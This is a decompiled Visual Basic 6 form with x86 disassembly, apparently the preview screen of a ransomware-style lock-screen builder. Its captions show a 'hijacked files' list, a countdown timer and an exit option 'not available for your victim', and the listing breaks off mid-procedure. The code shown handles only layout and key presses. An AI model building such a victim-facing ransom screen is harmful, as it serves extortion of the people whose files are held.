VERSION 5.00
Begin VB.Form frmHijackTest
  BackColor = &HFFFFFF&
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 0 'None
  'Icon = n/a
  LinkTopic = "Form1"
  ClientLeft = 0
  ClientTop = 0
  ClientWidth = 10455
  ClientHeight = 6420
  ShowInTaskbar = 0   'False
  StartUpPosition = 3 'Windows Default
  Begin VB.Timer tmrBlink
    Enabled = 0   'False
    Interval = 500
    Left = 1200
    Top = 0
  End
  Begin VB.ListBox lstFiles
    Left = 120
    Top = 840
    Width = 10215
    Height = 4740
    Visible = 0   'False
    TabIndex = 5
  End
  Begin VB.CommandButton cmdShowfiles
    Caption = "Show hijacked files"
    Left = 8280
    Top = 5760
    Width = 2055
    Height = 495
    TabIndex = 4
  End
  Begin VB.Timer tmrCountdown
    Interval = 1000
    Left = 720
    Top = 0
  End
  Begin VB.Timer tmrCheck
    Interval = 1
    Left = 240
    Top = 0
  End
  Begin VB.Label lblExit
    Caption = "Press ESC to exit (Not available for your victim)"
    Left = 120
    Top = 6000
    Width = 3375
    Height = 255
    TabIndex = 6
    BackStyle = 0 'Transparent
  End
  Begin VB.Label lblInstructions
    BackColor = &HFFFFFF&
    ForeColor = &HFF0000&
    Left = 120
    Top = 3240
    Width = 10215
    Height = 2175
    TabIndex = 3
    BackStyle = 0 'Transparent
    BeginProperty Font
      Name = "MS Sans Serif"
      Size = 9,75
      Charset = 0
      Weight = 700
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
  Begin VB.Label lblTimer
    BackColor = &HFFFFFF&
    ForeColor = &H0&
    Left = 4200
    Top = 5760
    Width = 3255
    Height = 375
    TabIndex = 2
    Alignment = 2 'Center
    WordWrap = -1  'True
    BackStyle = 0 'Transparent
    BeginProperty Font
      Name = "MS Sans Serif"
      Size = 18
      Charset = 0
      Weight = 700
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
  Begin VB.Label lblInfo
    BackColor = &HFFFFFF&
    Left = 120
    Top = 720
    Width = 10215
    Height = 2175
    TabIndex = 1
    Alignment = 2 'Center
    BackStyle = 0 'Transparent
    BeginProperty Font
      Name = "MS Sans Serif"
      Size = 12
      Charset = 0
      Weight = 700
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
  Begin VB.Label lblHeader
    Caption = "HEADER"
    BackColor = &HFFFFFF&
    ForeColor = &HFF&
    Left = 3720
    Top = 120
    Width = 2775
    Height = 375
    TabIndex = 0
    Alignment = 2 'Center
    BackStyle = 0 'Transparent
    BeginProperty Font
      Name = "MS Sans Serif"
      Size = 18
      Charset = 0
      Weight = 700
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
  End
End

Attribute VB_Name = "frmHijackTest"


Private sub tmrBlink__853410
00853410: push ebp
00853411: mov ebp, esp
00853413: sub esp, 0000000Ch
00853416: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0085341B: mov eax, fs:[00h]
00853421: push eax
00853422: mov fs:[00000000h], esp
00853429: push 00000034h
0085342B: pop eax
0085342C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00853431: push ebx
00853432: push esi
00853433: push edi
00853434: mov var_0C, esp
00853437: mov var_08, 0040C830h
0085343E: mov eax, [ebp+08h]
00853441: and eax, 00000001h
00853444: mov var_04, eax
00853447: mov eax, [ebp+08h]
0085344A: and al, FEh
0085344C: mov [ebp+08h], eax
0085344F: mov eax, [ebp+08h]
00853452: mov eax, [eax]
00853454: push [ebp+08h]
00853457: call [eax+04h]
0085345A: mov eax, [ebp+08h]
0085345D: mov eax, [eax]
0085345F: push [ebp+08h]
00853462: call [eax+00000320h]
00853468: push eax
00853469: lea eax, var_1C
0085346C: push eax
0085346D: call 00410A84h ; Set (object)
00853472: mov var_24, eax
00853475: lea eax, var_18
00853478: push eax
00853479: mov eax, var_24
0085347C: mov eax, [eax]
0085347E: push var_24
00853481: call [eax+50h]
00853484: fclex 
00853486: mov var_28, eax
00853489: cmp var_28, 00000000h
0085348D: jnl 8534A6h
0085348F: push 00000050h
00853491: push 004425E4h
00853496: push var_24
00853499: push var_28
0085349C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008534A1: mov var_3C, eax
008534A4: jmp 8534AAh
008534A6: and var_3C, 00000000h
008534AA: push var_18
008534AD: push 00000000h
008534AF: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008534B4: neg eax
008534B6: sbb eax, eax
008534B8: inc eax
008534B9: neg eax
008534BB: mov var_2C, ax
008534BF: lea ecx, var_18
008534C2: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008534C7: lea ecx, var_1C
008534CA: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008534CF: movsx eax, word ptr var_2C
008534D3: test eax, eax
008534D5: jz 0085359Ch
008534DB: mov eax, [ebp+08h]
008534DE: mov eax, [eax]
008534E0: push [ebp+08h]
008534E3: call [eax+00000320h]
008534E9: push eax
008534EA: lea eax, var_20
008534ED: push eax
008534EE: call 00410A84h ; Set (object)
008534F3: mov var_2C, eax
008534F6: mov eax, [ebp+08h]
008534F9: mov eax, [eax]
008534FB: push [ebp+08h]
008534FE: call [eax+00000320h]
00853504: push eax
00853505: lea eax, var_1C
00853508: push eax
00853509: call 00410A84h ; Set (object)
0085350E: mov var_24, eax
00853511: lea eax, var_18
00853514: push eax
00853515: mov eax, var_24
00853518: mov eax, [eax]
0085351A: push var_24
0085351D: call [eax+00000130h]
00853523: fclex 
00853525: mov var_28, eax
00853528: cmp var_28, 00000000h
0085352C: jnl 853548h
0085352E: push 00000130h
00853533: push 004425E4h
00853538: push var_24
0085353B: push var_28
0085353E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853543: mov var_40, eax
00853546: jmp 85354Ch
00853548: and var_40, 00000000h
0085354C: push var_18
0085354F: mov eax, var_2C
00853552: mov eax, [eax]
00853554: push var_2C
00853557: call [eax+54h]
0085355A: fclex 
0085355C: mov var_30, eax
0085355F: cmp var_30, 00000000h
00853563: jnl 85357Ch
00853565: push 00000054h
00853567: push 004425E4h
0085356C: push var_2C
0085356F: push var_30
00853572: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853577: mov var_44, eax
0085357A: jmp 853580h
0085357C: and var_44, 00000000h
00853580: lea ecx, var_18
00853583: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00853588: lea eax, var_20
0085358B: push eax
0085358C: lea eax, var_1C
0085358F: push eax
00853590: push 00000002h
00853592: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00853597: add esp, 0000000Ch
0085359A: jmp 8535F2h
0085359C: mov eax, [ebp+08h]
0085359F: mov eax, [eax]
008535A1: push [ebp+08h]
008535A4: call [eax+00000320h]
008535AA: push eax
008535AB: lea eax, var_1C
008535AE: push eax
008535AF: call 00410A84h ; Set (object)
008535B4: mov var_24, eax
008535B7: push 00000000h
008535B9: mov eax, var_24
008535BC: mov eax, [eax]
008535BE: push var_24
008535C1: call [eax+54h]
008535C4: fclex 
008535C6: mov var_28, eax
008535C9: cmp var_28, 00000000h
008535CD: jnl 8535E6h
008535CF: push 00000054h
008535D1: push 004425E4h
008535D6: push var_24
008535D9: push var_28
008535DC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008535E1: mov var_48, eax
008535E4: jmp 8535EAh
008535E6: and var_48, 00000000h
008535EA: lea ecx, var_1C
008535ED: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008535F2: mov var_04, 00000000h
008535F9: push 0085361Ch
008535FE: jmp 85361Bh
00853600: lea ecx, var_18
00853603: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00853608: lea eax, var_20
0085360B: push eax
0085360C: lea eax, var_1C
0085360F: push eax
00853610: push 00000002h
00853612: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00853617: add esp, 0000000Ch
0085361A: ret 
End Sub

Private sub lstFiles__853271
00853271: push ebp
00853272: mov ebp, esp
00853274: sub esp, 0000000Ch
00853277: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0085327C: mov eax, fs:[00h]
00853282: push eax
00853283: mov fs:[00000000h], esp
0085328A: push 00000020h
0085328C: pop eax
0085328D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00853292: push ebx
00853293: push esi
00853294: push edi
00853295: mov var_0C, esp
00853298: mov var_08, 0040C820h
0085329F: mov eax, [ebp+08h]
008532A2: and eax, 00000001h
008532A5: mov var_04, eax
008532A8: mov eax, [ebp+08h]
008532AB: and al, FEh
008532AD: mov [ebp+08h], eax
008532B0: mov eax, [ebp+08h]
008532B3: mov eax, [eax]
008532B5: push [ebp+08h]
008532B8: call [eax+04h]
008532BB: mov eax, [ebp+0Ch]
008532BE: cmp word ptr [eax], 001Bh
008532C2: jnz 008533D9h
008532C8: mov eax, [ebp+08h]
008532CB: mov eax, [eax]
008532CD: push [ebp+08h]
008532D0: call [eax+00000300h]
008532D6: push eax
008532D7: lea eax, var_18
008532DA: push eax
008532DB: call 00410A84h ; Set (object)
008532E0: mov var_1C, eax
008532E3: push 00000000h
008532E5: mov eax, var_1C
008532E8: mov eax, [eax]
008532EA: push var_1C
008532ED: call [eax+00000094h]
008532F3: fclex 
008532F5: mov var_20, eax
008532F8: cmp var_20, 00000000h
008532FC: jnl 853318h
008532FE: push 00000094h
00853303: push 004425F4h
00853308: push var_1C
0085330B: push var_20
0085330E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853313: mov var_2C, eax
00853316: jmp 85331Ch
00853318: and var_2C, 00000000h
0085331C: lea ecx, var_18
0085331F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00853324: mov eax, [ebp+08h]
00853327: mov eax, [eax]
00853329: push [ebp+08h]
0085332C: call [eax+00000304h]
00853332: push eax
00853333: lea eax, var_18
00853336: push eax
00853337: call 00410A84h ; Set (object)
0085333C: mov var_1C, eax
0085333F: push 00455308h ; Show hijacked files
00853344: mov eax, var_1C
00853347: mov eax, [eax]
00853349: push var_1C
0085334C: call [eax+54h]
0085334F: fclex 
00853351: mov var_20, eax
00853354: cmp var_20, 00000000h
00853358: jnl 853371h
0085335A: push 00000054h
0085335C: push 0044CDB4h
00853361: push var_1C
00853364: push var_20
00853367: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085336C: mov var_30, eax
0085336F: jmp 853375h
00853371: and var_30, 00000000h
00853375: lea ecx, var_18
00853378: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085337D: mov eax, [ebp+08h]
00853380: mov eax, [eax]
00853382: push [ebp+08h]
00853385: call [eax+00000304h]
0085338B: push eax
0085338C: lea eax, var_18
0085338F: push eax
00853390: call 00410A84h ; Set (object)
00853395: mov var_1C, eax
00853398: push FFFFFFFFh
0085339A: mov eax, var_1C
0085339D: mov eax, [eax]
0085339F: push var_1C
008533A2: call [eax+0000008Ch]
008533A8: fclex 
008533AA: mov var_20, eax
008533AD: cmp var_20, 00000000h
008533B1: jnl 8533CDh
008533B3: push 0000008Ch
008533B8: push 0044CDB4h
008533BD: push var_1C
008533C0: push var_20
008533C3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008533C8: mov var_34, eax
008533CB: jmp 8533D1h
008533CD: and var_34, 00000000h
008533D1: lea ecx, var_18
008533D4: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008533D9: mov var_04, 00000000h
008533E0: push 008533F1h
008533E5: jmp 8533F0h
008533E7: lea ecx, var_18
008533EA: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008533EF: ret 
End Sub

Private sub Form__852458
00852458: push ebp
00852459: mov ebp, esp
0085245B: sub esp, 00000018h
0085245E: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00852463: mov eax, fs:[00h]
00852469: push eax
0085246A: mov fs:[00000000h], esp
00852471: mov eax, 000000ECh
00852476: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085247B: push ebx
0085247C: push esi
0085247D: push edi
0085247E: mov var_18, esp
00852481: mov var_14, 0040C7D0h
00852488: mov eax, [ebp+08h]
0085248B: and eax, 00000001h
0085248E: mov var_10, eax
00852491: mov eax, [ebp+08h]
00852494: and al, FEh
00852496: mov [ebp+08h], eax
00852499: mov var_0C, 00000000h
008524A0: mov eax, [ebp+08h]
008524A3: mov eax, [eax]
008524A5: push [ebp+08h]
008524A8: call [eax+04h]
008524AB: mov var_04, 00000001h
008524B2: mov var_04, 00000002h
008524B9: push FFFFFFFFh
008524BB: call 00410A60h ; On Error ...
008524C0: mov var_04, 00000003h
008524C7: cmp [008F529Ch], 00000000h
008524CE: jnz 8524EBh
008524D0: push 008F529Ch
008524D5: push 00440F2Ch
008524DA: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008524DF: mov var_000000A8, 008F529Ch
008524E9: jmp 8524F5h
008524EB: mov var_000000A8, 008F529Ch
008524F5: mov eax, var_000000A8
008524FB: mov eax, [eax]
008524FD: mov var_74, eax
00852500: lea eax, var_24
00852503: push eax
00852504: mov eax, var_74
00852507: mov eax, [eax]
00852509: push var_74
0085250C: call [eax+18h]
0085250F: fclex 
00852511: mov var_78, eax
00852514: cmp var_78, 00000000h
00852518: jnl 852534h
0085251A: push 00000018h
0085251C: push 00440F1Ch
00852521: push var_74
00852524: push var_78
00852527: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085252C: mov var_000000AC, eax
00852532: jmp 85253Bh
00852534: and var_000000AC, 00000000h
0085253B: mov eax, var_24
0085253E: mov var_7C, eax
00852541: lea eax, var_64
00852544: push eax
00852545: mov eax, var_7C
00852548: mov eax, [eax]
0085254A: push var_7C
0085254D: call [eax+00000098h]
00852553: fclex 
00852555: mov var_80, eax
00852558: cmp var_80, 00000000h
0085255C: jnl 85257Bh
0085255E: push 00000098h
00852563: push 0044C888h
00852568: push var_7C
0085256B: push var_80
0085256E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852573: mov var_000000B0, eax
00852579: jmp 852582h
0085257B: and var_000000B0, 00000000h
00852582: mov eax, [ebp+08h]
00852585: mov eax, [eax]
00852587: push [ebp+08h]
0085258A: call [eax+00000320h]
00852590: push eax
00852591: lea eax, var_28
00852594: push eax
00852595: call 00410A84h ; Set (object)
0085259A: mov var_00000084, eax
008525A0: lea eax, var_68
008525A3: push eax
008525A4: mov eax, var_00000084
008525AA: mov eax, [eax]
008525AC: push var_00000084
008525B2: call [eax+00000080h]
008525B8: fclex 
008525BA: mov var_00000088, eax
008525C0: cmp var_00000088, 00000000h
008525C7: jnl 8525ECh
008525C9: push 00000080h
008525CE: push 004425E4h
008525D3: push var_00000084
008525D9: push var_00000088
008525DF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008525E4: mov var_000000B4, eax
008525EA: jmp 8525F3h
008525EC: and var_000000B4, 00000000h
008525F3: mov eax, [ebp+08h]
008525F6: mov eax, [eax]
008525F8: push [ebp+08h]
008525FB: call [eax+00000320h]
00852601: push eax
00852602: lea eax, var_2C
00852605: push eax
00852606: call 00410A84h ; Set (object)
0085260B: mov var_0000008C, eax
00852611: mov var_58, 80020004h
00852618: mov var_60, 0000000Ah
0085261F: mov var_48, 80020004h
00852626: mov var_50, 0000000Ah
0085262D: mov var_38, 80020004h
00852634: mov var_40, 0000000Ah
0085263B: push 00000010h
0085263D: pop eax
0085263E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852643: lea esi, var_60
00852646: mov edi, esp
00852648: movsd 
00852649: movsd 
0085264A: movsd 
0085264B: movsd 
0085264C: push 00000010h
0085264E: pop eax
0085264F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852654: lea esi, var_50
00852657: mov edi, esp
00852659: movsd 
0085265A: movsd 
0085265B: movsd 
0085265C: movsd 
0085265D: push 00000010h
0085265F: pop eax
00852660: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852665: lea esi, var_40
00852668: mov edi, esp
0085266A: movsd 
0085266B: movsd 
0085266C: movsd 
0085266D: movsd 
0085266E: fld real4 ptr var_64
00852671: cmp [008F2000h], 00000000h
00852678: jnz 852682h
0085267A: fdiv real4 ptr [00402B64h]
00852680: jmp 85268Dh
00852682: push [00402B64h]
00852688: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
0085268D: fld real4 ptr var_68
00852690: cmp [008F2000h], 00000000h
00852697: jnz 8526A1h
00852699: fdiv real4 ptr [00402B64h]
0085269F: jmp 8526ACh
008526A1: push [00402B64h]
008526A7: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
008526AC: fsubp st(1), st(0)
008526AE: fstsw ax
008526B0: test al, 0Dh
008526B2: jnz 0085326Ch
008526B8: push ecx
008526B9: fstp real4 ptr [esp]
008526BC: mov eax, var_0000008C
008526C2: mov eax, [eax]
008526C4: push var_0000008C
008526CA: call [eax+000001D0h]
008526D0: fclex 
008526D2: mov var_00000090, eax
008526D8: cmp var_00000090, 00000000h
008526DF: jnl 852704h
008526E1: push 000001D0h
008526E6: push 004425E4h
008526EB: push var_0000008C
008526F1: push var_00000090
008526F7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008526FC: mov var_000000B8, eax
00852702: jmp 85270Bh
00852704: and var_000000B8, 00000000h
0085270B: lea eax, var_2C
0085270E: push eax
0085270F: lea eax, var_28
00852712: push eax
00852713: lea eax, var_24
00852716: push eax
00852717: push 00000003h
00852719: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0085271E: add esp, 00000010h
00852721: mov var_04, 00000004h
00852728: lea eax, var_64
0085272B: push eax
0085272C: mov eax, [ebp+08h]
0085272F: mov eax, [eax]
00852731: push [ebp+08h]
00852734: call [eax+00000080h]
0085273A: fclex 
0085273C: mov var_74, eax
0085273F: cmp var_74, 00000000h
00852743: jnl 852762h
00852745: push 00000080h
0085274A: push 004448FCh
0085274F: push [ebp+08h]
00852752: push var_74
00852755: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085275A: mov var_000000BC, eax
00852760: jmp 852769h
00852762: and var_000000BC, 00000000h
00852769: mov eax, [ebp+08h]
0085276C: mov eax, [eax]
0085276E: push [ebp+08h]
00852771: call [eax+00000318h]
00852777: push eax
00852778: lea eax, var_24
0085277B: push eax
0085277C: call 00410A84h ; Set (object)
00852781: mov var_78, eax
00852784: lea eax, var_68
00852787: push eax
00852788: mov eax, var_78
0085278B: mov eax, [eax]
0085278D: push var_78
00852790: call [eax+00000080h]
00852796: fclex 
00852798: mov var_7C, eax
0085279B: cmp var_7C, 00000000h
0085279F: jnl 8527BEh
008527A1: push 00000080h
008527A6: push 004425E4h
008527AB: push var_78
008527AE: push var_7C
008527B1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008527B6: mov var_000000C0, eax
008527BC: jmp 8527C5h
008527BE: and var_000000C0, 00000000h
008527C5: lea eax, var_6C
008527C8: push eax
008527C9: mov eax, [ebp+08h]
008527CC: mov eax, [eax]
008527CE: push [ebp+08h]
008527D1: call [eax+00000088h]
008527D7: fclex 
008527D9: mov var_80, eax
008527DC: cmp var_80, 00000000h
008527E0: jnl 8527FFh
008527E2: push 00000088h
008527E7: push 004448FCh
008527EC: push [ebp+08h]
008527EF: push var_80
008527F2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008527F7: mov var_000000C4, eax
008527FD: jmp 852806h
008527FF: and var_000000C4, 00000000h
00852806: mov eax, [ebp+08h]
00852809: mov eax, [eax]
0085280B: push [ebp+08h]
0085280E: call [eax+00000318h]
00852814: push eax
00852815: lea eax, var_28
00852818: push eax
00852819: call 00410A84h ; Set (object)
0085281E: mov var_00000084, eax
00852824: lea eax, var_70
00852827: push eax
00852828: mov eax, var_00000084
0085282E: mov eax, [eax]
00852830: push var_00000084
00852836: call [eax+00000088h]
0085283C: fclex 
0085283E: mov var_00000088, eax
00852844: cmp var_00000088, 00000000h
0085284B: jnl 852870h
0085284D: push 00000088h
00852852: push 004425E4h
00852857: push var_00000084
0085285D: push var_00000088
00852863: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852868: mov var_000000C8, eax
0085286E: jmp 852877h
00852870: and var_000000C8, 00000000h
00852877: mov eax, [ebp+08h]
0085287A: mov eax, [eax]
0085287C: push [ebp+08h]
0085287F: call [eax+00000318h]
00852885: push eax
00852886: lea eax, var_2C
00852889: push eax
0085288A: call 00410A84h ; Set (object)
0085288F: mov var_0000008C, eax
00852895: mov var_58, 80020004h
0085289C: mov var_60, 0000000Ah
008528A3: mov var_48, 80020004h
008528AA: mov var_50, 0000000Ah
008528B1: fld real4 ptr var_6C
008528B4: cmp [008F2000h], 00000000h
008528BB: jnz 8528C5h
008528BD: fdiv real8 ptr [0040C818h]
008528C3: jmp 8528D6h
008528C5: push [0040C81Ch]
008528CB: push [0040C818h]
008528D1: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
008528D6: fld real4 ptr var_70
008528D9: cmp [008F2000h], 00000000h
008528E0: jnz 8528EAh
008528E2: fdiv real4 ptr [00402B64h]
008528E8: jmp 8528F5h
008528EA: push [00402B64h]
008528F0: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
008528F5: fstsw ax
008528F7: test al, 0Dh
008528F9: jnz 0085326Ch
008528FF: fsubp st(1), st(0)
00852901: fstp real8 ptr var_38
00852904: fstsw ax
00852906: test al, 0Dh
00852908: jnz 0085326Ch
0085290E: mov var_40, 00000005h
00852915: push 00000010h
00852917: pop eax
00852918: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085291D: lea esi, var_60
00852920: mov edi, esp
00852922: movsd 
00852923: movsd 
00852924: movsd 
00852925: movsd 
00852926: push 00000010h
00852928: pop eax
00852929: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085292E: lea esi, var_50
00852931: mov edi, esp
00852933: movsd 
00852934: movsd 
00852935: movsd 
00852936: movsd 
00852937: push 00000010h
00852939: pop eax
0085293A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085293F: lea esi, var_40
00852942: mov edi, esp
00852944: movsd 
00852945: movsd 
00852946: movsd 
00852947: movsd 
00852948: fld real4 ptr var_64
0085294B: cmp [008F2000h], 00000000h
00852952: jnz 85295Ch
00852954: fdiv real4 ptr [00402B64h]
0085295A: jmp 852967h
0085295C: push [00402B64h]
00852962: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
00852967: fld real4 ptr var_68
0085296A: cmp [008F2000h], 00000000h
00852971: jnz 85297Bh
00852973: fdiv real4 ptr [00402B64h]
00852979: jmp 852986h
0085297B: push [00402B64h]
00852981: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
00852986: fsubp st(1), st(0)
00852988: fstsw ax
0085298A: test al, 0Dh
0085298C: jnz 0085326Ch
00852992: push ecx
00852993: fstp real4 ptr [esp]
00852996: mov eax, var_0000008C
0085299C: mov eax, [eax]
0085299E: push var_0000008C
008529A4: call [eax+000001D0h]
008529AA: fclex 
008529AC: mov var_00000090, eax
008529B2: cmp var_00000090, 00000000h
008529B9: jnl 8529DEh
008529BB: push 000001D0h
008529C0: push 004425E4h
008529C5: push var_0000008C
008529CB: push var_00000090
008529D1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008529D6: mov var_000000CC, eax
008529DC: jmp 8529E5h
008529DE: and var_000000CC, 00000000h
008529E5: lea eax, var_2C
008529E8: push eax
008529E9: lea eax, var_28
008529EC: push eax
008529ED: lea eax, var_24
008529F0: push eax
008529F1: push 00000003h
008529F3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008529F8: add esp, 00000010h
008529FB: mov var_04, 00000005h
00852A02: mov eax, [ebp+08h]
00852A05: mov eax, [eax]
00852A07: push [ebp+08h]
00852A0A: call [eax+00000320h]
00852A10: push eax
00852A11: lea eax, var_24
00852A14: push eax
00852A15: call 00410A84h ; Set (object)
00852A1A: mov var_74, eax
00852A1D: lea eax, var_64
00852A20: push eax
00852A21: mov eax, var_74
00852A24: mov eax, [eax]
00852A26: push var_74
00852A29: call [eax+78h]
00852A2C: fclex 
00852A2E: mov var_78, eax
00852A31: cmp var_78, 00000000h
00852A35: jnl 852A51h
00852A37: push 00000078h
00852A39: push 004425E4h
00852A3E: push var_74
00852A41: push var_78
00852A44: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852A49: mov var_000000D0, eax
00852A4F: jmp 852A58h
00852A51: and var_000000D0, 00000000h
00852A58: lea eax, var_68
00852A5B: push eax
00852A5C: mov eax, [ebp+08h]
00852A5F: mov eax, [eax]
00852A61: push [ebp+08h]
00852A64: call [eax+00000080h]
00852A6A: fclex 
00852A6C: mov var_7C, eax
00852A6F: cmp var_7C, 00000000h
00852A73: jnl 852A92h
00852A75: push 00000080h
00852A7A: push 004448FCh
00852A7F: push [ebp+08h]
00852A82: push var_7C
00852A85: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852A8A: mov var_000000D4, eax
00852A90: jmp 852A99h
00852A92: and var_000000D4, 00000000h
00852A99: mov eax, [ebp+08h]
00852A9C: mov eax, [eax]
00852A9E: push [ebp+08h]
00852AA1: call [eax+0000031Ch]
00852AA7: push eax
00852AA8: lea eax, var_28
00852AAB: push eax
00852AAC: call 00410A84h ; Set (object)
00852AB1: mov var_80, eax
00852AB4: mov var_58, 80020004h
00852ABB: mov var_60, 0000000Ah
00852AC2: fld real4 ptr var_68
00852AC5: fsub real4 ptr [00402BA0h]
00852ACB: fstp real4 ptr var_48
00852ACE: fstsw ax
00852AD0: test al, 0Dh
00852AD2: jnz 0085326Ch
00852AD8: mov var_50, 00000004h
00852ADF: fld real4 ptr var_64
00852AE2: fadd real4 ptr [0040C814h]
00852AE8: fstp real4 ptr var_38
00852AEB: fstsw ax
00852AED: test al, 0Dh
00852AEF: jnz 0085326Ch
00852AF5: mov var_40, 00000004h
00852AFC: push 00000010h
00852AFE: pop eax
00852AFF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852B04: lea esi, var_60
00852B07: mov edi, esp
00852B09: movsd 
00852B0A: movsd 
00852B0B: movsd 
00852B0C: movsd 
00852B0D: push 00000010h
00852B0F: pop eax
00852B10: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852B15: lea esi, var_50
00852B18: mov edi, esp
00852B1A: movsd 
00852B1B: movsd 
00852B1C: movsd 
00852B1D: movsd 
00852B1E: push 00000010h
00852B20: pop eax
00852B21: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852B26: lea esi, var_40
00852B29: mov edi, esp
00852B2B: movsd 
00852B2C: movsd 
00852B2D: movsd 
00852B2E: movsd 
00852B2F: fld real4 ptr [00402BA0h]
00852B35: push ecx
00852B36: fstp real4 ptr [esp]
00852B39: mov eax, var_80
00852B3C: mov eax, [eax]
00852B3E: push var_80
00852B41: call [eax+000001D0h]
00852B47: fclex 
00852B49: mov var_00000084, eax
00852B4F: cmp var_00000084, 00000000h
00852B56: jnl 852B78h
00852B58: push 000001D0h
00852B5D: push 004425E4h
00852B62: push var_80
00852B65: push var_00000084
00852B6B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852B70: mov var_000000D8, eax
00852B76: jmp 852B7Fh
00852B78: and var_000000D8, 00000000h
00852B7F: lea eax, var_28
00852B82: push eax
00852B83: lea eax, var_24
00852B86: push eax
00852B87: push 00000002h
00852B89: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00852B8E: add esp, 0000000Ch
00852B91: mov var_04, 00000006h
00852B98: mov eax, [ebp+08h]
00852B9B: mov eax, [eax]
00852B9D: push [ebp+08h]
00852BA0: call [eax+0000031Ch]
00852BA6: push eax
00852BA7: lea eax, var_24
00852BAA: push eax
00852BAB: call 00410A84h ; Set (object)
00852BB0: mov var_74, eax
00852BB3: lea eax, var_64
00852BB6: push eax
00852BB7: mov eax, var_74
00852BBA: mov eax, [eax]
00852BBC: push var_74
00852BBF: call [eax+78h]
00852BC2: fclex 
00852BC4: mov var_78, eax
00852BC7: cmp var_78, 00000000h
00852BCB: jnl 852BE7h
00852BCD: push 00000078h
00852BCF: push 004425E4h
00852BD4: push var_74
00852BD7: push var_78
00852BDA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852BDF: mov var_000000DC, eax
00852BE5: jmp 852BEEh
00852BE7: and var_000000DC, 00000000h
00852BEE: mov eax, [ebp+08h]
00852BF1: mov eax, [eax]
00852BF3: push [ebp+08h]
00852BF6: call [eax+0000031Ch]
00852BFC: push eax
00852BFD: lea eax, var_28
00852C00: push eax
00852C01: call 00410A84h ; Set (object)
00852C06: mov var_7C, eax
00852C09: lea eax, var_68
00852C0C: push eax
00852C0D: mov eax, var_7C
00852C10: mov eax, [eax]
00852C12: push var_7C
00852C15: call [eax+00000088h]
00852C1B: fclex 
00852C1D: mov var_80, eax
00852C20: cmp var_80, 00000000h
00852C24: jnl 852C43h
00852C26: push 00000088h
00852C2B: push 004425E4h
00852C30: push var_7C
00852C33: push var_80
00852C36: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852C3B: mov var_000000E0, eax
00852C41: jmp 852C4Ah
00852C43: and var_000000E0, 00000000h
00852C4A: lea eax, var_6C
00852C4D: push eax
00852C4E: mov eax, [ebp+08h]
00852C51: mov eax, [eax]
00852C53: push [ebp+08h]
00852C56: call [eax+00000080h]
00852C5C: fclex 
00852C5E: mov var_00000084, eax
00852C64: cmp var_00000084, 00000000h
00852C6B: jnl 852C8Dh
00852C6D: push 00000080h
00852C72: push 004448FCh
00852C77: push [ebp+08h]
